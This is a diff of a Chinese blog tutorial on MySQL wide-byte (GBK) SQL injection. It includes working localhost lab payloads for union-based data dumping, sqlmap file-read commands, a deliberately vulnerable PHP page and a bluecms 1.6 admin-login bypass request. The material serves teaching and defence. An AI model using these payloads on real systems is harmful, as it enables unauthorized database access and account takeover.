@@ -20,12 +20,12 @@
     var CONFIG = {"hostname":"cs-cshi.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"valine","storage":true,"lazyload":false,"nav":null,"activeClass":"valine"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="本文作者：Setup， 转载请注明来自(FreeBuf.COM)[https:&#x2F;&#x2F;www.freebuf.com&#x2F;]">
+  <meta name="description" content="SQL 宽字节注入深度讲解，包含 SQL 注入常见流程、SQL 宽字节注入以及防护">
 <meta property="og:type" content="article">
 <meta property="og:title" content="宽字节注入深度讲解">
 <meta property="og:url" content="https://cs-cshi.github.io/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E6%B7%B1%E5%BA%A6%E8%AE%B2%E8%A7%A3/index.html">
 <meta property="og:site_name" content="Chang">
-<meta property="og:description" content="本文作者：Setup， 转载请注明来自(FreeBuf.COM)[https:&#x2F;&#x2F;www.freebuf.com&#x2F;]">
+<meta property="og:description" content="SQL 宽字节注入深度讲解，包含 SQL 注入常见流程、SQL 宽字节注入以及防护">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://image.3001.net/images/20180316/15211806792467.png!small">
 <meta property="og:image" content="https://image.3001.net/images/20180316/15211808532895.png!small">
@@ -35,8 +35,23 @@
 <meta property="og:image" content="https://image.3001.net/images/20180316/15211809709556.png!small">
 <meta property="og:image" content="https://image.3001.net/images/20180316/1521180980159.png!small">
 <meta property="og:image" content="https://image.3001.net/images/20180316/15211809868608.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180316/15211809937810.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180316/15211810014295.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180316/15211810104586.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180316/15211810181970.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180316/15211810262911.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180316/15211810344824.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180316/15211810431922.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180316/15211810501173.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180316/15211810576597.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180316/15211810954085.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180316/15211811103257.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180316/15211811265121.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180316/15211811425693.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180316/15211811512315.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20180316/15211811595369.png!small">
 <meta property="article:published_time" content="2021-05-13T08:19:28.758Z">
-<meta property="article:modified_time" content="2021-05-13T08:45:31.987Z">
+<meta property="article:modified_time" content="2021-05-13T09:42:15.621Z">
 <meta property="article:author" content="Charles">
 <meta property="article:tag" content="网络安全">
 <meta property="article:tag" content="Web 安全">
@@ -224,7 +239,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2021-05-13 16:19:28 / 修改时间：16:45:31" itemprop="dateCreated datePublished" datetime="2021-05-13T16:19:28+08:00">2021-05-13</time>
+              <time title="创建时间：2021-05-13 16:19:28 / 修改时间：17:42:15" itemprop="dateCreated datePublished" datetime="2021-05-13T16:19:28+08:00">2021-05-13</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -264,14 +279,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>3.2k</span>
+              <span>12k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>3 分钟</span>
+              <span>11 分钟</span>
             </span>
 
         </div>
@@ -283,7 +298,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>本文作者：Setup， 转载请注明来自(FreeBuf.COM)[<a target="_blank" rel="noopener" href="https://www.freebuf.com/]">https://www.freebuf.com/]</a></p>
+        <p>SQL 宽字节注入深度讲解，包含 SQL 注入常见流程、SQL 宽字节注入以及防护</p>
 <span id="more"></span>
 
 <h2 id="1-基本概念"><a href="#1-基本概念" class="headerlink" title="1. 基本概念"></a>1. 基本概念</h2><p>  宽字节是相对于ascII这样单字节而言的；像 GB2312、GBK、GB18030、BIG5、Shift_JIS 等这些都是常说的宽字节，实际上只有两字节</p>
@@ -297,16 +312,15 @@
 </li>
 <li><p>进行内部操作前，将请求按照如下规则转化成内部操作字符集，如下：</p>
 </li>
-<li><p>1 使用字段 CHARACTER SET 设定值；</p>
-</li>
-<li><p>2 若上述值不存在，使用对应数据表的DEFAULT CHARACTER SET设定值；<br><img src="https://image.3001.net/images/20180316/15211808617493.png!small" alt="3"></p>
-</li>
-<li><p>3 若上述值不存在，则使用对应数据库的DEFAULT CHARACTER SET设定值；</p>
-</li>
-<li><p>4 若上述值不存在，则使用character_set_server设定值。</p>
-</li>
-<li><p>执行完 SQL 语句之后，将执行结果按照 character_set_results 编码进行输出。</p>
-</li>
+</ol>
+<ul>
+<li>使用字段 CHARACTER SET 设定值；</li>
+<li>若上述值不存在，使用对应数据表的DEFAULT CHARACTER SET设定值；<br><img src="https://image.3001.net/images/20180316/15211808617493.png!small" alt="3"></li>
+<li>若上述值不存在，则使用对应数据库的DEFAULT CHARACTER SET设定值；</li>
+<li>若上述值不存在，则使用character_set_server设定值。</li>
+</ul>
+<ol start="4">
+<li>执行完 SQL 语句之后，将执行结果按照 character_set_results 编码进行输出。</li>
 </ol>
 <h2 id="3-宽字节注入"><a href="#3-宽字节注入" class="headerlink" title="3. 宽字节注入"></a>3. 宽字节注入</h2><p>宽字节注入指的是 mysql 数据库在使用宽字节（GBK）编码时，会认为两个字符是一个汉字（前一个ascii码要大于128（比如%df），才到汉字的范围），而且当我们输入单引号时，mysql会调用转义函数，将单引号变为&#39;，其中\的十六进制是%5c,mysql的GBK编码，会认为%df%5c是一个宽字节，也就是’運’，从而使单引号闭合（逃逸），进行注入攻击。<br><img src="https://image.3001.net/images/20180316/15211808764388.png!small" alt="4"></p>
 <p>宽字节注入发生的位置就是PHP发送请求到MYSQL时字符集使用character_set_client设置值进行了一次编码，然后服务器会根据character_set_connection把请求进行转码，从character_set_client转成character_set_connection，然后更新到数据库的时候，再转化成字段所对应的编码</p>
@@ -319,9 +333,120 @@
 
 <p>加上 <code>echo &quot;&lt;br&gt;&quot;.&quot;执行的sql语句是:&quot;.$sql.&quot;&lt;br&gt;&quot;</code> 这句话，可以清楚的查看sql语句的变化过程。</p>
 <p>sql 语句是 <code>SELECT * FROM news WHERE tid=&#39;&#123;$id&#125;</code> 根据 id 从数据库表中获取信息。</p>
-<p><img src="https://image.3001.net/images/20180316/15211809709556.png!small" alt="6"><br>单纯加上单引号没有报错，说明addslashes函数发挥了作用，将’ –&gt; &#39;，这样就不会存在注入了。</p>
+<h4 id="4-1-1-确定注入点"><a href="#4-1-1-确定注入点" class="headerlink" title="4.1.1 确定注入点"></a>4.1.1 确定注入点</h4><p><img src="https://image.3001.net/images/20180316/15211809709556.png!small" alt="6"><br>单纯加上单引号没有报错，说明addslashes函数发挥了作用，将’ –&gt; &#39;，这样就不会存在注入了。</p>
 <p><img src="https://image.3001.net/images/20180316/1521180980159.png!small" alt="7"><br>此时，在单引号前面加上前面讲的%df,是**mysql认为%df**是一个汉字，这样’就可以逃逸出来，使tid = ‘1’闭合。</p>
 <p>这时候，按说是可以构造查询语句了，可是为什么还在报错呢，因为tid=’1’后面的’没有闭合，需要使用注释符号(– ‘或#)将这个多余的’注释掉，这样就可以构造注入语句了。<br><img src="https://image.3001.net/images/20180316/15211809868608.png!small" alt="8"></p>
+<p>下面就可以按照手动注入的思路进行数据的获取了。</p>
+<h4 id="4-1-2-确定表的字段数"><a href="#4-1-2-确定表的字段数" class="headerlink" title="4.1.2 确定表的字段数"></a>4.1.2 确定表的字段数</h4><p>由于接下来要采用union探测内容，而union的规则是必须要求列数相同才能正常展示，因此必须要探测列数，保证构造的注入查询结果与元查询结果列数与数据类型相同； ‘order by 1’代表按第一列升序排序，若数字代表的列不存在，则会报错，由此可以探测出有多少列。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php?id&#x3D;1 %df&#39; order by 4 -- &#39;</span><br></pre></td></tr></table></figure>
+<p><img src="https://image.3001.net/images/20180316/15211809937810.png!small" alt="8"></p>
+<p>可知一共有3个字段</p>
+<h4 id="4-1-3-确定字段的显示位"><a href="#4-1-3-确定字段的显示位" class="headerlink" title="4.1.3 确定字段的显示位"></a>4.1.3 确定字段的显示位</h4><p>显示位：表中数据第几位的字段可以 显示，因为并不是所有的查询结果都 会展示在页面中，因此需要探测页面 中展示的查询结果是哪一列的结果; ‘union select 1,2,3 – ‘ 通过显示的数字可以判断那些字段可以显示出来。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php?id&#x3D;-1 %df&#39; union select 1,2,3 -- &#39;</span><br></pre></td></tr></table></figure>
+<p><img src="https://image.3001.net/images/20180316/15211810014295.png!small" alt="9"></p>
+<p>id的值要用-1或者该表中没有用过的id值，否则测试值会被覆盖。</p>
+<h4 id="4-1-4-获取当前数据库信息"><a href="#4-1-4-获取当前数据库信息" class="headerlink" title="4.1.4 获取当前数据库信息"></a>4.1.4 获取当前数据库信息</h4><h5 id="1-获取当前数据库名"><a href="#1-获取当前数据库名" class="headerlink" title="1. 获取当前数据库名"></a>1. 获取当前数据库名</h5><p>现在只有两个字段可以显示信息，显然在后面的查询数据中，两个字段是不够用，可以使用：</p>
+<ul>
+<li>group_concat()函数（可以把查询出来的多行数据连接起来在一个字段中显示） </li>
+<li>database()函数：查看当前数据库名称 </li>
+<li>version()函数：查看数据库版本信息 </li>
+<li>user():返回当前数据库连接使用的用户 </li>
+<li>char():将十进制ASCII码转化成字符<br><img src="https://image.3001.net/images/20180316/15211810104586.png!small" alt="10"></li>
+</ul>
+<p>当前数据库名为’test’。</p>
+<h5 id="2-获取test数据库中的表信息"><a href="#2-获取test数据库中的表信息" class="headerlink" title="2. 获取test数据库中的表信息"></a>2. 获取test数据库中的表信息</h5><p>Mysql有一个系统的数据库 information_schema,里面保存着所有数据库的相关信息，使用该表完成注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php?id&#x3D;-1 %df&#39; union select 1,2,group_concat(table_name)  </span><br><span class="line">from information_schema.tables where table_schema&#x3D;0x74657374 -- &#39;</span><br></pre></td></tr></table></figure>
+<p><img src="https://image.3001.net/images/20180316/15211810181970.png!small" alt="11"></p>
+<p>由于存在addslashes转义了单引号，如果在table_schema中继续使用单引号包裹数据库名字，就会报错，这时候需要使用十六进制编码来避免这个问题。</p>
+<h5 id="3-获取admin表的字段"><a href="#3-获取admin表的字段" class="headerlink" title="3. 获取admin表的字段"></a>3. 获取admin表的字段</h5><p>column_name表示获取字段名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php?id&#x3D;-1 %df&#39; union select 1,2,group_concat(column_name)  </span><br><span class="line">from information_schema.columns where table_name&#x3D;0x61646d696e -- &#39;</span><br></pre></td></tr></table></figure>
+<p><img src="https://image.3001.net/images/20180316/15211810262911.png!small" alt="12"></p>
+<p>table_name 需要使用十六进制编码</p>
+<h5 id="4-获取-admin-表的数据"><a href="#4-获取-admin-表的数据" class="headerlink" title="4. 获取 admin 表的数据"></a>4. 获取 admin 表的数据</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php?id&#x3D;-1 %df&#39; union select 1,2,concat(name,char(58),pass) from admin -- &#39;</span><br></pre></td></tr></table></figure>
+<p><img src="https://image.3001.net/images/20180316/15211810344824.png!small" alt="13"><br>数据获取到了，可以更深入一下，比如进行文件的读取，提权等操作。</p>
+<h5 id="5-获取当前用户信息"><a href="#5-获取当前用户信息" class="headerlink" title="5. 获取当前用户信息"></a>5. 获取当前用户信息</h5><p>此次会用到工具SQLMAP，sqlmap是一个SQL注入工具。此一具在业界称为神器。sqlmap是用python语言编写，如果想对工具详细了解，请到官网了解。</p>
+<p>下载和使用</p>
+<blockquote>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://sqlmap.org/">http://sqlmap.org/</a></li>
+<li><a target="_blank" rel="noopener" href="http://blog.csdn.net/whatday/article/details/54766536">http://blog.csdn.net/whatday/article/details/54766536</a></li>
+</ul>
+</blockquote>
+<p>本实验用到sqlmap，以下是用sqlmap工具操作。使用sqlmap工具第一步猜用户</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;127.0.0.1/index.php?id=1 %df&#x27;&quot; --current-user</span><br></pre></td></tr></table></figure>
+<p><img src="https://image.3001.net/images/20180316/15211810431922.png!small" alt="14"></p>
+<p>看到是root用户，可以更方便的搞事情了。</p>
+<h5 id="6-读服务器中的文件"><a href="#6-读服务器中的文件" class="headerlink" title="6. 读服务器中的文件"></a>6. 读服务器中的文件</h5><p>sqlmap 中–file-read参数，可以读取服务器端任意文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;127.0.0.1/index.php?id=1 %df&#x27;&quot; --file-read=&quot;./index.php&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="https://image.3001.net/images/20180316/15211810501173.png!small" alt="15"></p>
+<p>已经将文件保存到了本地/root/.sqlmap/output/127.0.0.1/files文件夹下</p>
+<p>正常思路，接下来可以进行提权了，由于该环境是搭建在windows下的，使用–file-write参数进行写文件的操作不能执行，这里就不做演示了。</p>
+<h3 id="4-2-实验2"><a href="#4-2-实验2" class="headerlink" title="4.2 实验2"></a>4.2 实验2</h3><p>为了方便演示该注入的过程，搭建一下环境<br>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1WC4D-3o-A7uYAi8w_yQ7sA">https://pan.baidu.com/s/1WC4D-3o-A7uYAi8w_yQ7sA</a> 密码：sbwy<br>数据库名为test，数据库的编码全部为gdk<br><img src="https://image.3001.net/images/20180316/15211810576597.png!small" alt="16"></p>
+<p>将 index.php 放到 phpStudy 的 WWW 目录下，将 test.sql 文件导入到数据库中即可</p>
+<p>源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Team:红日安全团队</span></span><br><span class="line"><span class="comment">团队成员：CPR</span></span><br><span class="line"><span class="comment">Title：宽字节注入</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//连接数据库部分，注意使用了gbk编码</span></span><br><span class="line"><span class="variable">$conn</span> = mysql_connect(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;root&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;bad!&#x27;</span>);</span><br><span class="line">mysql_query(<span class="string">&quot;SET NAMES &#x27;gbk&#x27;&quot;</span>);</span><br><span class="line">mysql_select_db(<span class="string">&#x27;test&#x27;</span>, <span class="variable">$conn</span>) <span class="keyword">OR</span> emMsg(<span class="string">&quot;连接数据库失败，未找到您填写的数据库&quot;</span>);</span><br><span class="line"><span class="comment">//执行sql语句</span></span><br><span class="line">mysql_query(<span class="string">&quot;SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary&quot;</span>, <span class="variable">$conn</span>); </span><br><span class="line"><span class="variable">$id</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]) ? addslashes(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]) : <span class="number">1</span>;</span><br><span class="line"><span class="variable">$id</span> = iconv(<span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;gbk&#x27;</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM news WHERE tid=&#x27;<span class="subst">&#123;$id&#125;</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>, <span class="variable">$conn</span>) <span class="keyword">or</span> <span class="keyword">die</span>(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="string">&quot;sql:&quot;</span>.<span class="variable">$sql</span>.<span class="string">&quot;&lt;br&gt;&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;gbk&quot;</span> /&gt;</span><br><span class="line">&lt;title&gt;gbk change utf-<span class="number">8</span>&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>, MYSQL_ASSOC);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;<span class="subst">&#123;$row[&#x27;title&#x27;]&#125;</span>&lt;/h2&gt;&lt;p&gt;<span class="subst">&#123;$row[&#x27;content&#x27;]&#125;</span>&lt;p&gt;\n&quot;</span>;</span><br><span class="line">mysql_free_result(<span class="variable">$result</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>同样也使用了 addslashes转义，然后使用iconv进行转码，由utf-8 –&gt;gbk</p>
+<p>为了避免宽字节注入，很多人使用iconv函数（能够完成各种字符集间的转换$text=iconv(“UTF-8”,”GBK”,$text);），其实这样做是有很大风险的，仍旧可以造成宽字节注入。</p>
+<p><strong>可以使用逆向思维，先找一个gbk的汉字錦,錦的utf-8编码是0xe98ca6，它的gbk编码是0xe55c,是不是已经看出来了，当传入的值是錦’，’通过addslashes转义为&#39;(%5c%27),錦通过icov转换为%e5%5c，终止变为了%e5%5c%5c%27,不难看出%5c%5c正好把反斜杠转义，使单引号逃逸，造成注入。</strong></p>
+<h4 id="4-2-1-注入点"><a href="#4-2-1-注入点" class="headerlink" title="4.2.1 注入点"></a>4.2.1 注入点</h4><p>按照实验1的思路，可以执行宽字节注入<br><img src="https://image.3001.net/images/20180316/15211810954085.png!small" alt="16"><br>出现报错信息，说明存在宽字节注入。</p>
+<p><img src="https://image.3001.net/images/20180316/15211811103257.png!small" alt="17"><br>%5c%5c正好把反斜杠转义，使单引号逃逸</p>
+<p><img src="https://image.3001.net/images/20180316/15211811265121.png!small" alt="18"><br>获取到数据信息（这里的sql注入方法和实验1一样，读者可以自己尝试练习）</p>
+<h3 id="4-3-实验3"><a href="#4-3-实验3" class="headerlink" title="4.3 实验3"></a>4.3 实验3</h3><p>bluecms 1.6 版本存在宽字节注入，环境源码：</p>
+<p>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/11PQqPdopA9bkLBY9gYrpqA">https://pan.baidu.com/s/11PQqPdopA9bkLBY9gYrpqA</a> 密码：ek6o</p>
+<p>漏洞复现</p>
+<p>该cms的宽字节注入漏洞存在于<a target="_blank" rel="noopener" href="http://127.0.0.1/bluecmsv1.6/uploads/admin/index.php.%E6%AD%A4%E5%9C%B0%E5%9D%80%E6%98%AF%E6%88%91%E4%BB%AC%E7%9A%84%E5%AE%89%E8%A3%85%E5%9C%B0%E5%9D%80%EF%BC%8C%E5%A6%82%E6%9E%9C%E6%98%AF%E5%9C%A8%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA%EF%BC%8C%E9%9C%80%E8%A6%81%E6%A0%B9%E6%8D%AE%E4%BD%A0%E7%9A%84%E6%9C%AC%E5%9C%B0%E5%9C%B0%E5%9D%80%E5%92%8C%E8%B7%AF%E5%BE%84%E6%9D%A5%E8%BF%9B%E8%A1%8C%E5%88%A4%E6%96%AD%E3%80%82">http://127.0.0.1/bluecmsv1.6/uploads/admin/index.php.此地址是我们的安装地址，如果是在本地搭建，需要根据你的本地地址和路径来进行判断。</a></p>
+<p>为了更好演示效果，我们进行如下安装。首先根据上面提示的下载地址进行下载源码。</p>
+<p>将整个bluecms文件放到phpStudy的WWW目录下，浏览器访问url/bluecms/uploads/install 根据提示进行安装。</p>
+<p><img src="https://image.3001.net/images/20180316/15211811425693.png!small" alt="19"><br>数据库参数配置</p>
+<p>访问<a target="_blank" rel="noopener" href="http://127.0.0.1/bluecmsv1.6/uploads/admin/login.php?act=login">http://127.0.0.1/bluecmsv1.6/uploads/admin/login.php?act=login</a> 进入存在注入的页面。</p>
+<p>在管理员界面输入登录信息：<br><img src="https://image.3001.net/images/20180316/15211811512315.png!small" alt="20"></p>
+<p>使用burp suit 进行抓包：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;bluecmsv1.6&#x2F;uploads&#x2F;admin&#x2F;login.php HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko&#x2F;20100101 Firefox&#x2F;49.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http:&#x2F;&#x2F;127.0.0.1&#x2F;bluecmsv1.6&#x2F;uploads&#x2F;admin&#x2F;login.php?act&#x3D;login</span><br><span class="line">Cookie: PHPSESSID&#x3D;om57mhu92141dqc3hn8ajce8q1</span><br><span class="line">DNT: 1</span><br><span class="line">X-Forwarded-For: 8.8.8.8</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 63</span><br><span class="line">​</span><br><span class="line">admin_name&#x3D;admin&amp;admin_pwd&#x3D;123&amp;submit&#x3D;%B5%C7%C2%BC&amp;act&#x3D;do_login</span><br></pre></td></tr></table></figure>
+<p>admin_name就是注入点，可以实现万能密码登录</p>
+<p>构造payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;bluecmsv1.6&#x2F;uploads&#x2F;admin&#x2F;login.php HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko&#x2F;20100101 Firefox&#x2F;49.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http:&#x2F;&#x2F;127.0.0.1&#x2F;bluecmsv1.6&#x2F;uploads&#x2F;admin&#x2F;login.php?act&#x3D;login</span><br><span class="line">DNT: 1</span><br><span class="line">X-Forwarded-For: 8.8.8.8</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 80</span><br><span class="line">​</span><br><span class="line">admin_name&#x3D;admin %df&#39; or 1&#x3D;1 -- &#39;&amp;admin_pwd&#x3D;11&amp;submit&#x3D;%B5%C7%C2%BC&amp;act&#x3D;do_login</span><br></pre></td></tr></table></figure>
+<p>成功登录后台<br><img src="https://image.3001.net/images/20180316/15211811595369.png!small" alt="21"></p>
+<h4 id="4-3-1-源码分析"><a href="#4-3-1-源码分析" class="headerlink" title="4.3.1 源码分析"></a>4.3.1 源码分析</h4><p>看下管理员登录界面的源码admin/login.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="string">&#x27;IN_BLUE&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">​</span><br><span class="line"><span class="keyword">require_once</span>(dirname(<span class="keyword">__FILE__</span>) . <span class="string">&#x27;/include/common.inc.php&#x27;</span>);</span><br><span class="line"><span class="variable">$act</span> = !<span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;act&#x27;</span>]) ? trim(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;act&#x27;</span>]) : <span class="string">&#x27;login&#x27;</span>;</span><br><span class="line">​</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$act</span> == <span class="string">&#x27;login&#x27;</span>)&#123;</span><br><span class="line">   <span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;admin_id&#x27;</span>])&#123;</span><br><span class="line">       showmsg(<span class="string">&#x27;您已登录，不用再次登录&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   template_assign(<span class="string">&#x27;current_act&#x27;</span>, <span class="string">&#x27;登录&#x27;</span>);</span><br><span class="line">   <span class="variable">$smarty</span>-&gt;display(<span class="string">&#x27;login.htm&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>在第二行可以看到包含了/include/common.inc.php文件，跟进一下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require_once</span>(BLUE_ROOT.<span class="string">&#x27;include/mysql.class.php&#x27;</span>);</span><br><span class="line">​</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> mysql(<span class="variable">$dbhost</span>,<span class="variable">$dbuser</span>,<span class="variable">$dbpass</span>,<span class="variable">$dbname</span>);</span><br></pre></td></tr></table></figure>
+
+<p>第一行包含了include/mysql.class.php文件，第二行实例化mysql对象，继续跟进mysql.class.php</p>
